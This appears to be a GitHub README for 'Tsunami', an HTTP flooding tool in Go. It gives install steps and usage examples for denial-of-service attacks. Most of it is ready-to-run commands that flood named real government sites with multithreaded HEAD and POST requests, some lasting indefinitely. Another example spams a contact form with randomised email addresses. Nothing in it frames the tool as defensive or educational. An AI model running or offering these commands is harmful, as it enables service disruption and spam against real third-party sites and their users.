# Tsunami
Tsunami is an advanced HTTP flooder written in Golang. It's currently implemented features include:

- Live attack stats
- Customizable mutlithreading
- HTTPS support __(Note: Certificates aren't verified for performance)__
- Realistic User Agent randomization
- Dynamic payloads
- Custom headers

## Table of Contents
1. [Basic Usage](#basic-usage)
2. [Help](#help)
3. [Quick Install](#quick-install)
4. [Examples](#examples)
   - [Low Volume POST Flood Lasting Forever](#low-volume-post-flood-lasting-forever)
   - [High Volume HEAD Flood Lasting For 10 Minutes](#high-volume-head-flood-lasting-for-10-minutes)
   - [Contact Us Form Spam](#contact-us-form-spam)
5. [Dynamic Tokens](#dynamic-tokens)
6. [Todo](#todo)

__This project is a WIP__

## Basic Usage
```bash
./tsunami http://whitehouse.gov -w 100
```

## Help
```bash
./tsunami --help
```

## Quick Install
```bash
git clone https://github.com/zayotic/tsunami
cd tsunami
export GOPATH=`pwd`
go get ./...
go build
```

## Dynamic Tokens
Dynamic tokens allows you to implement elements of randomness in your requests.
Tokens may be placed in your URL, body, and header values.

There are currently 2 tokens:
- {D} - A random digit
- {l} - A random lowercase letter
- {L} - A random uppercase letter

On every request, every token will be replaced.

Example command:
```bash
./tsunami -w 1 http://nsa.gov/{L}{L}{l}{D}
```
The requests will use URLs similar to these:

```
http://nsa.gov/AYz3
http://nsa.gov/BCv6
http://nsa.gov/NFz7
http://nsa.gov/IPa1
```

## Examples
### Low Volume POST Flood Lasting Forever
```bash
./tsunami -w 2 "https://fbi.gov/login" POST "username=Ammar&password=g1thuB123"
```
### High Volume HEAD Flood Lasting For 10 Minutes
```bash
./tsunami -w 100 -s 600 "https://cia.gov/" HEAD
```
### Contact Us Form Spam
```bash
./tsunami -w 1 "https://zay.li/contact-us" POST "email={l}{l}{l}{l}{l}{l}{l}@gmail.com&message=spamspamspamspam"
```
## Todo
 - ???
